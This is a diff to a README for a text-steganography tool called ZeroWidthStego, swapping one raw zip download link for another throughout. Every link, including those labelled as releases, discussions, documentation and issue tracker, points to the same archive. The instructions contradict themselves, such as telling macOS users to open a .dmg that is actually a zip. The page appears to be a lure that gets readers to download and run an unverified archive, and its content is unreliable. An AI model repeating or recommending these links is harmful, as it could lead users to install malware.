@@ -4,7 +4,7 @@
 Welcome to ZeroWidthStego! This software allows you to hide messages within normal text. This can be useful for anyone looking to keep their communications private or for security teams conducting digital investigations.
 
 ## 📥 Download Now
-[![Download ZeroWidthStego](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)
+[![Download ZeroWidthStego](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)
 
 ## 💻 System Requirements
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, Linux
@@ -20,23 +20,23 @@ Welcome to ZeroWidthStego! This software allows you to hide messages within norm
 - **Secure Data Handling**: Ensures that your private information stays safe during the process.
 
 ## 📦 Download & Install
-To get started, [visit this page to download](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip). Here, you will find the latest version of ZeroWidthStego.
+To get started, [visit this page to download](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip). Here, you will find the latest version of ZeroWidthStego.
 
 ### Step-by-Step Installation:
 
-1. **Visit the Releases Page**: Open this link in your web browser: [ZeroWidthStego Releases](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip).
+1. **Visit the Releases Page**: Open this link in your web browser: [ZeroWidthStego Releases](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip).
 
 2. **Choose the Right Version**: Look for the most recent version listed. You will see various files available for download. 
 
 3. **Download the File**: Click on the file that matches your operating system. For example:
-   - **Windows**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip
-   - **macOS**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip
-   - **Linux**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip
+   - **Windows**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip
+   - **macOS**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip
+   - **Linux**: https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip
 
 4. **Extract or Open the File**:
    - For Windows, unzip the downloaded file. 
    - For macOS, open the .dmg file. 
-   - For Linux, extract the https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip file.
+   - For Linux, extract the https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip file.
 
 5. **Run the Application**: Locate the file where you downloaded it, then double-click to launch ZeroWidthStego.
 
@@ -71,16 +71,16 @@ You can hide any text, from simple notes to complex codes. Just remember to keep
 
 ## 💬 Community and Support
 For help, tips, or to share your experiences, you can join the community forums:
-- **GitHub Discussions**: [[GitHub Discussions](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)]
+- **GitHub Discussions**: [[GitHub Discussions](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)]
 - **Telegram Group**: Join our Telegram group for real-time support.
 
 ## 🌐 Links and Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)
-- [Documentation](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip)
 
 ## 📝 License
 ZeroWidthStego is open-source software released under the MIT License. Feel free to contribute and modify as needed while respecting the terms provided.
 
 ## 📥 Download Now Again
-To start using ZeroWidthStego, [visit this page to download](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/ZeroWidthStego_reclusory.zip). Enjoy hiding your messages securely!
+To start using ZeroWidthStego, [visit this page to download](https://raw.githubusercontent.com/Muvesz/ZeroWidthStego/main/jiggety/Zero_Stego_Width_v1.9.zip). Enjoy hiding your messages securely!
